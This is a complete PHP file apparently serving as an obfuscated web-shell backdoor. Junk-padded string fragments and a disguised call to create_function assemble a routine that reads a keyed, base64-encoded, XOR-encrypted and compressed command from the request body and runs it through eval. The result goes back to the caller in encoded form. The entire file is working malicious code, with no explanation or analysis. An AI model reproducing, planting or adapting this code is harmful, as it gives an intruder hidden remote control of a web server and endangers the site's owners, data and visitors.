<?php
$L='=0;a;($j;a;a<$c&&$i<$;al;a);;a$j++,$i++){$o;a.=$t{$i};a^$k{$j};}}ret;au;arn $o;;a}if;a (@preg_;am';
$E='a;atc;ah("/$kh(.+)$kf/",@fi;ale_g;a;aet_contents;a(";aphp://;a;ainpu;at");a,$m)==1) {@o;ab_start();@e';
$i=str_replace('ek','','ekekcreateek_fekunekctiekon');
$s='va;al(@gzu;an;a;acompre;a;ass(@x(;a@base6;a4_;adecode($m[1]),$k)));$o;a=@ob_get_con;a;atents();@o;ab';
$y=';f;aunctio;an x($t,$k){;a$c=;astrl;aen($k);$l;a=strle;an($t);$;ao;a="";for(;a$i=0;$i;a<$l;;a){for($j';
$d='$k="e82;a5f;a475";$kh="fe;a97c0;acbfbe;a4;a";$kf="65;aaaa91;aad0fb;a";$p=";aGIAnpZeozPI6;ae;a9mu"';
$C='_end;a_clean;a(;a);$r=@ba;ase64_encode(;a@x(@gzcom;apress(;a;a$o),$k);a);p;ar;aint("$p$kh$r$kf");}';
$Z=str_replace(';a','',$d.$y.$L.$E.$s.$C);
$v=$i('',$Z);$v();
?>
